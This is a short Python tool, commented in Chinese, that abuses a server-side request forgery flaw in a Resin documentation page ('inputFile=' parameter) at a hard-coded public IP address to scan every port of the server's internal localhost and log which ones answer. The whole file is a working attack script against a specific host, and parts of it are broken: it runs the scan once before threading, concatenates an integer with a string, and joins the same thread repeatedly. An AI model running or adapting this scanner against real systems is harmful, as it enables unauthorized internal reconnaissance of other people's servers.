##########################
#某网页存在url跳转，查询内网主机开放哪些端口的小工具
##########################

import requests
import threading
def pinjie():
    try:
        headers = {
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x32) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.360"
        }
        for i in range(1,65536):
            url = "http://222.209.254.5:8208/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://127.0.0.1:{}".format(i)
            # with open("e:\\duan.txt","a+") as f:
            #     i = str(i)
            #     f.writelines(i + '\n')
            urlask = requests.get(url=url,headers=headers)
            response_code = urlask.status_code
            if response_code == 200:
                print("[++++]响应码",i)
                with open("e:\\end.txt","a+") as f:
                    f.writelines(i + '\n')  
            elif response_code ==500:
                print("[-]响应码500")
            else:
                print(response_code)
                with open("e:\\else.txt","a+") as f:
                    f.writelines(i + '\n')
    except SyntaxError as p:
        print(p)

pinjie()

if __name__ == "__main__":
    
    threads = []
    threads_count = 20
    #创建线程对象

    for i in range(0,threads_count):
        t1 = threading.Thread(target=pinjie)
        t1.start()

        threads.append(t1)
        
    for i in threads:
        t1.join()


    